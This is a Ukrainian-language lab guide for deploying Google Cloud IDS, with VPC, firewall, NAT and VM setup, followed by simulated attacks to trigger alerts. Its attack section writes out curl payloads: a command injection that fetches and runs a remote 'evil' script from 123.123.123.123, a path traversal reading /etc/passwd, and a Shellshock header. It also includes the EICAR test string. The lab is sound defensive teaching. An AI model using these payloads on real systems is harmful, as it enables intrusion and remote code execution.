# Розгортання хмарної системи виявлення вторгнень (Cloud IDS)

## Увімкнути API, необхідні для розгортання

1) У Cloud Shell, щоб встановити змінну середовища Project_ID , виконайте таку команду:

```sh
export PROJECT_ID=$(gcloud config get-value project | sed '2d')
```

2) Увімкніть Service Networking API:

```sh
gcloud services enable servicenetworking.googleapis.com \
    --project=$PROJECT_ID
```

3) Увімкніть Cloud IDS API:

```sh
gcloud services enable ids.googleapis.com \
    --project=$PROJECT_ID
```

4) Увімкніть Cloud Logging API:

```sh
gcloud services enable logging.googleapis.com \
    --project=$PROJECT_ID
```

## Створіть коло мережі Google Cloud. Ви створюєте мережу Google Cloud VPC і налаштовуєте доступ до приватних служб

1) У Cloud Shell, щоб створити VPC, виконайте таку команду:

```sh
gcloud compute networks create cloud-ids \
--subnet-mode=custom
```

2) Додайте підмережу до VPC для дзеркального трафіку в us-east1:

```sh
gcloud compute networks subnets create cloud-ids-useast1 \
--range=192.168.10.0/24 \
--network=cloud-ids \
--region=us-east1
```

3) Налаштувати доступ до приватних служб:

```sh
gcloud compute addresses create cloud-ids-ips \
--global \
--purpose=VPC_PEERING \
--addresses=10.10.10.0 \
--prefix-length=24 \
--description="Cloud IDS Range" \
--network=cloud-ids
```

4) Створіть приватне підключення:

```sh
gcloud services vpc-peerings connect \
--service=servicenetworking.googleapis.com \
--ranges=cloud-ids-ips \
--network=cloud-ids \
--project=$PROJECT_ID
```

## Створення кінцевої точки Cloud IDS. Cloud IDS використовує ресурс, відомий як кінцева точка IDS, зональний ресурс, який може перевіряти трафік із будь-якої зони свого регіону. Кожна кінцева точка IDS отримує дзеркальний трафік і виконує аналіз виявлення загроз

1) Щоб створити кінцеву точку Cloud IDS, у Cloud Shell виконайте таку команду (може створюватись до 20 хвилин):

```sh
gcloud ids endpoints create cloud-ids-east1 \
--network=cloud-ids \
--zone=us-east1-b \
--severity=INFORMATIONAL \
--async
```

2) Переконайтеся, що кінцева точка Cloud IDS ініційована:

```sh
gcloud ids endpoints list --project=$PROJECT_ID
```

## Створення правил Firewall і Cloud NAT

1) Щоб створити правило allow-http-icmp, у Cloud Shell виконайте таку команду:

```sh
gcloud compute firewall-rules create allow-http-icmp \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:80,icmp \
--source-ranges=0.0.0.0/0 \
--target-tags=server
```

2) Створіть правило allow-iap-proxy:

```sh
gcloud compute firewall-rules create allow-iap-proxy \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:22 \
--source-ranges=35.235.240.0/20
```

3) Щоб створити хмарний маршрутизатор, виконайте таку команду:

```sh
gcloud compute routers create cr-cloud-ids-useast1 \
--region=us-east1 \
--network=cloud-ids
```

4) Щоб налаштувати Cloud NAT, виконайте таку команду:

```sh
gcloud compute routers nats create nat-cloud-ids-useast1 \
--router=cr-cloud-ids-useast1 \
--router-region=us-east1 \
--auto-allocate-nat-external-ips \
--nat-all-subnet-ip-ranges
```

## Створіть дві віртуальні машини. Перша віртуальна машина — це ваш веб-сервер, який дзеркалює Cloud IDS. Друга віртуальна машина є джерелом вашого трафіку атаки

1) Щоб створити віртуальну машину, яка буде дзеркалом сервера в Cloud IDS, у Cloud Shell виконайте таку команду:

```sh
gcloud compute instances create server \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.20 \
--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
--tags=server \
--image=debian-10-buster-v20210512 \
--image-project=debian-cloud \
--boot-disk-size=30GB
```

2) Створіть віртуальну машину як клієнта, який надсилає трафік атаки:

```sh
gcloud compute instances create attacker \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.10 \
--image=debian-10-buster-v20210512 \
--image-project=debian-cloud \
--boot-disk-size=10GB
```

3) Щоб установити підключення SSH до вашого сервера через IAP, виконайте таку команду:

```sh
gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap
```

4) Щоб перевірити стан веб-служби, виконайте таку команду Linux:

```sh
sudo systemctl status nginx
```

5) Змінити каталог на веб-сервіс:

```sh
cd /var/www/html/
```

6) Створіть безпечний файл зловмисного ПЗ на веб-сервері:

```sh
sudo touch eicar.file
```

```sh
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
```

7) Вийдіть із серверної оболонки віртуальної машини та поверніться до Cloud Shell

## Створіть політику віддзеркалення пакетів Cloud IDS

1) Щоб перевірити, чи ваша кінцева точка Cloud IDS активна, у Cloud Shell виконайте таку команду, щоб показати поточний стан кінцевої точки Cloud IDS:

```sh
gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
```

2) Коли стан зміниться на READY, иизначте правило переадресації кінцевої точки Cloud IDS:

```sh
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
echo $FORWARDING_RULE
```

3) Створіть і приєднайте політику віддзеркалення пакетів:

```sh
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
--region=us-east1 \
--collector-ilb=$FORWARDING_RULE \
--network=cloud-ids \
--mirrored-subnets=cloud-ids-useast1
```

4) Переконайтеся, що політику віддзеркалення пакетів створено:

```sh
gcloud compute packet-mirrorings list
```

## Змоделювати трафік атаки

1) Щоб установити підключення SSH до віртуальної машини зловмисника через IAP, у Cloud Shell виконайте таку команду:

```sh
gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
```

2) Виконайте такі curlзапити послідовно, щоб імітувати сповіщення низького, середнього, високого та критичного рівня серйозності в IDS:

```sh
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
```

```sh
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
```

```sh
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
```

```sh
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
```

3) Вийдіть із оболонки віртуальної машини зловмисника та поверніться до Cloud Shell

## Перегляньте загрози, виявлені Cloud IDS

У консолі Google Cloud у навігаційному меню ( Навігаційне меню) натисніть «Безпека мережі» > «Cloud IDS» .
Перейдіть на вкладку Загрози. Cloud IDS зафіксував різні профілі трафіку атак і надав детальну інформацію про кожну загрозу.
